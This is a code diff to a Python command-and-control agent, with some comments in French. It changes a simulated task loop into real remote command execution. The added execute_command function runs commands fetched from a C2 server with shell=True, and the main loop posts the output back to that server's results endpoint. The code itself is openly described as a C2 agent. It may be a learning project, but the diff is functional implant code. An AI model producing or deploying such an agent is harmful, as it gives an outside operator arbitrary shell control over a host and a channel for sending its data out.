@@ -4,6 +4,7 @@ import os
 import uuid
 import time
 import requests # type: ignore
+import subprocess
 from pydantic import BaseModel
 from typing import Optional
 
@@ -21,7 +22,12 @@ class AgentCheckIn(BaseModel):
     os_version: str
 
 class TaskResponse(BaseModel):
+    task_id: Optional[int] = None
     command: Optional[str] = None
+
+class TaskResult(BaseModel):
+    task_id: int
+    result: str
 
 # --- FONCTIONS ---
 
@@ -42,6 +48,40 @@ def get_system_info() -> AgentCheckIn:
         internal_ip="127.0.0.1", # Simplifié
         os_version=f"{platform.system()} {platform.release()}"
     )
+
+def execute_command(command: str) -> str:
+    """
+    Exécute une commande shell et capture la sortie.
+    """
+    print(f"⚙️  Exécution: {command}")
+    try:
+        # subprocess.run est plus sûr que os.system
+        # SECURITY WARNING: shell=True allows command injection, but is required
+        # for a C2 agent to execute arbitrary shell commands (pipes, redirects, etc.)
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
+
+        stdout = result.stdout.strip()
+        stderr = result.stderr.strip()
+
+        parts = []
+        if stdout:
+            parts.append(f"[STDOUT]\n{stdout}")
+        if stderr:
+            parts.append(f"[STDERR]\n{stderr}")
+
+        output = "\n".join(parts)
+        return output if output else "(No output)"
+
+    except subprocess.TimeoutExpired:
+        return "⚠️ Timeout expired"
+    except Exception as e:
+        return f"⚠️ Error executing command: {e}"
 
 def main():
     # 1. Collecte (Type strict : AgentCheckIn)
@@ -69,13 +109,27 @@ def main():
         try:
             print("💤 Demande de travail...")
             resp = requests.get(f"{SERVER_URL}/api/v1/tasks/{my_info.agent_id}")
+            resp.raise_for_status()
 
             # On force la réponse à rentrer dans notre modèle TaskResponse
             task_data = TaskResponse.model_validate(resp.json())
             
-            if task_data.command:
-                print(f"⚙️  ORDRE REÇU ET VALIDÉ : {task_data.command}")
-                # Exécution (simulation)
+            if task_data.command and task_data.task_id is not None:
+                print(f"📥 ORDRE REÇU : {task_data.command}")
+
+                # Exécution réelle
+                output = execute_command(task_data.command)
+
+                # Envoi du résultat
+                result_data = TaskResult(task_id=task_data.task_id, result=output)
+
+                post_resp = requests.post(
+                    f"{SERVER_URL}/api/v1/results",
+                    json=result_data.model_dump()
+                )
+                post_resp.raise_for_status()
+                print(f"📤 Résultat envoyé.")
+
             else:
                 print("ø Rien à faire.")
 
@@ -86,4 +140,3 @@ def main():
 
 if __name__ == "__main__":
     main()
- 
